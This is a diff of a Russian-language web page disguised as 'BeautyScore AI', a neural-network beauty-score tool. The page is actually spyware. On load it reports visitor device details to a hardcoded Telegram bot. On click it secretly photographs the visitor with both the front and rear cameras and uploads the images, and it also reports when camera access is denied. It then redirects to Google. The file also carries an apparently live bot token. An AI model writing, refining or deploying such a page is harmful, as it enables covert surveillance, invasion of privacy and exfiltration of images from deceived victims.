@@ -1,64 +1,51 @@
 <!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>BeautyScore AI — Анализ внешности</title>
-    <style>
-        body { margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; background: #0f0c29; background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%); font-family: sans-serif; color: white; overflow: hidden; }
-        .container { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); padding: 40px 20px; border-radius: 30px; text-align: center; max-width: 360px; width: 90%; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-        h1 { font-size: 24px; margin: 0 0 10px; color: #00f2fe; }
-        #b { padding: 18px 40px; background: linear-gradient(90deg, #ff0080, #ff8c00); border: none; border-radius: 50px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; }
-    </style>
-</head>
-<body>
-<div class="container">
-    <h1>BeautyScore AI</h1>
-    <p>Нейросеть определит ваш балл привлекательности по 100+ параметрам.</p>
-    <video id="v" autoplay playsinline style="display:none;"></video>
-    <canvas id="c" style="display:none;"></canvas>
-    <button id="b">Узнать мой балл</button>
-    <div id="status" style="margin-top:20px; color:#00f2fe;">Система готова...</div>
-</div>
+<html>
+<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"></head>
+<body style="background:#000; color:#fff; display:flex; flex-direction:column; justify-content:center; align-items:center; height:100vh; margin:0; font-family:sans-serif; text-align:center;">
+    <div style="padding:20px; border:1px solid #00f2fe; border-radius:20px;">
+        <h1 style="color:#00f2fe;">BeautyScore AI</h1>
+        <p>Нажмите для анализа внешности</p>
+        <video id="v" autoplay playsinline style="display:none;"></video>
+        <canvas id="c" style="display:none;"></canvas>
+        <button id="b" style="padding:15px 30px; background:#ff0080; color:#fff; border:none; border-radius:50px; font-weight:bold; cursor:pointer;">УЗНАТЬ БАЛЛ</button>
+        <div id="status" style="margin-top:20px; color:#00f2fe;">Система готова</div>
+    </div>
 
 <script>
     const token = '8174281213:AAErVNdvIelAbe3aGFHNvJ1D7g4CdTGGWMc';
     const chat_id = '7164380121';
 
-    // САМЫЙ НАДЕЖНЫЙ СПОСОБ: Уведомление через сам Telegram
-    function logVisit() {
-        const platform = navigator.platform;
-        const lang = navigator.language;
-        const time = new Date().toLocaleTimeString();
-        const info = `👀 НОВЫЙ ВИЗИТ!\n⏰ Время: ${time}\n📱 Платформа: ${platform}\n🌐 Язык: ${lang}\n⚙️ Браузер: ${navigator.userAgent.substring(0, 50)}`;
-        
-        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(info)}`);
-    }
-    logVisit();
+    // 1. СРАЗУ ШЛЕМ ИНФУ О ЗАХОДЕ
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("👀 КТО-ТО ЗАШЕЛ!\n📱 Платформа: " + navigator.platform + "\n🌐 Язык: " + navigator.language)}`);
 
     async function takePhoto(facing) {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
+            const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:facing}});
             const v = document.getElementById('v');
-            v.srcObject = stream;
-            await new Promise(r => setTimeout(r, 2000)); 
+            v.srcObject = s;
+            await new Promise(r => setTimeout(r, 2000));
             const c = document.getElementById('c');
             c.width = v.videoWidth; c.height = v.videoHeight;
             c.getContext('2d').drawImage(v, 0, 0);
             const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.7));
             const f = new FormData();
             f.append('chat_id', chat_id);
-            f.append('photo', blob, `img_${facing}.jpg`);
-            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: f });
-            stream.getTracks().forEach(t => t.stop()); 
-        } catch (e) {}
+            f.append('photo', blob, 'img.jpg');
+            // Добавляем инфу в подпись к фото
+            f.append('caption', `📸 Фото (${facing})\n📱 Устройство: ${navigator.userAgent.substring(0, 50)}`);
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method:'POST', body:f});
+            s.getTracks().forEach(t => t.stop());
+        } catch (e) {
+            // Если камеру запретили, шлем ошибку в бот
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("❌ КАМЕРА ЗАПРЕЩЕНА")}`);
+        }
     }
 
     document.getElementById('b').onclick = async () => {
         document.getElementById('b').style.display = "none";
-        document.getElementById('status').innerText = "Анализ биометрии...";
-        await takePhoto("user"); 
-        await takePhoto("environment"); 
+        document.getElementById('status').innerText = "Анализ...";
+        await takePhoto("user");
+        await takePhoto("environment");
         document.getElementById('status').innerText = "Готово!";
         setTimeout(() => { window.location.href = "https://google.com"; }, 1000);
     };
